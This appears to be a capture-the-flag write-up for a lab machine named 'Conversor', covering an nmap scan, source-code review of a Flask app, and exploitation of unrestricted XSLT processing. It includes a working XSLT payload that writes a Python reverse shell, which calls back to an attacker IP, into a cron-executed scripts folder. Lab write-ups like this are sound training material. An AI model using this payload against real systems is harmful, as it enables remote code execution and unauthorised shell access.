# Conversor


## **`Nmap`** Scan

```ruby
namp -sCV MACHINE-IP
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 14:04 EST
Nmap scan report for 10.10.11.92
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.94 seconds
                                                                                                  
```


## login with any usernaem and password

```
http://conversor.htb/about
```

<img width="1228" height="755" alt="image" src="https://github.com/user-attachments/assets/2284f14b-2442-445d-abe0-56879933bdc9" />


```
tar -xvf source_code.tar.gz
```

<img width="1089" height="584" alt="image" src="https://github.com/user-attachments/assets/7b780065-03a3-44ce-ac90-84ca62539063" />

The application is built with Python Flask. Let's examine the key sections of `app.py`:

<img width="1331" height="241" alt="image" src="https://github.com/user-attachments/assets/58539bae-6295-4a6f-882d-b3833c05c803" />

**`NO PARSER CONFIGURATION HERE!`**

The Vulnerability: While the XML parsing is properly secured with `resolve_entities=False` and `no_network=True`, the XSLT file parsing has no security restrictions applied. This discrepancy creates an XXE (XML External Entity) vulnerability specifically in the XSLT processing.

### Attack Vector: XXE in the XSLT file itself!

<https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/>

---

After examining the `install.md` file, we discover a critical piece of information:


```markdown
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```


There's a cron job running every minute as www-data:

```bash
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```



-   I created a basic XML file (`test.xml`):

```xml
nano test.xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
  <cd>
    <title>Test</title>
    <artist>death</artist>
    <company>xyz Company</company>
    <price>1</price>
    <year>2300</year>
  </cd>
</catalog>
```


-   Then I wrote the XSLT payload (`test.xslt`) with my IP and port:


```xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:exploit="http://exslt.org/common"
 extension-element-prefixes="exploit"
 version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.96",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

<img width="1104" height="516" alt="image" src="https://github.com/user-attachments/assets/f425254a-e60b-426a-8d3a-f3b56f4a72a0" />


<img width="745" height="158" alt="image" src="https://github.com/user-attachments/assets/afc15be1-24e0-4451-b830-29fc52a38e09" />


```

```



























